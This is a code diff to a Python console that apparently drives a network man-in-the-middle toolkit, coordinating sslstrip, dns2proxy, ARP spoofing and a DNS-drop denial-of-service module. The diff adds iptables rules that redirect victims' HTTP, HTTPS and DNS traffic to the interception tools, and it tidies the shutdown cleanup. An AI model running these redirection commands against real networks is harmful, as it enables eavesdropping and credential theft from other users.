@@ -32,7 +32,7 @@ import psutil
 class Processor(object):
 	name = "Interface-Processor"
 	desc = "Console to process commands"
-	version = "1.0"
+	version = "1.1"
 
 
 	def __init__(self):
@@ -103,11 +103,12 @@ class Processor(object):
 						if self.sslstrip_status == True:
 							self.pskill(self.p1.pid)
 							print "[*] SSLstrip finalized."
-							iptables()
 						if self.dns2proxy_status == True:
 							self.pskill(self.p2.pid)
 							print "[*] DNS2Proxy finalized."
+						if self.arpspoof_status == True:
 							iptables()
+							set_ip_forwarding(0)
 						exit()
 
 
@@ -117,6 +118,7 @@ class Processor(object):
 						if self.arpspoof_status:
 							try:
 									#iptables redirect traffic to port that sslstrip are listening
+	                                                        os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8000")
 								os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8000")
 									#iptables redirect traffic to port that dns2proxy are listening
 								os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
@@ -935,17 +937,18 @@ class Processor(object):
 
 
 		except KeyboardInterrupt:
-                       	if self.sslstrip_status == True:
-                        	self.pskill(self.p1.pid)
-                                print "\n[*] SSLstrip finalized."
-				iptables()
-                        if self.dns2proxy_status == True:
-                                self.pskill(self.p2.pid)
-                                print "[*] DNS2Proxy finalized."
-				iptables()
+			print "[*] User requested shutdown."
 			if self.dnsdrop_status == 1:
 				self.dos.dnsdropstop()
-			print "[*] User requested shutdown."
+			if self.sslstrip_status == True:
+				self.pskill(self.p1.pid)
+				print "[*] SSLstrip finalized."
+			if self.dns2proxy_status == True:
+				self.pskill(self.p2.pid)
+				print "[*] DNS2Proxy finalized."
+			if self.arpspoof_status == True:
+				iptables()
+				set_ip_forwarding(0)
 			exit()
 
 
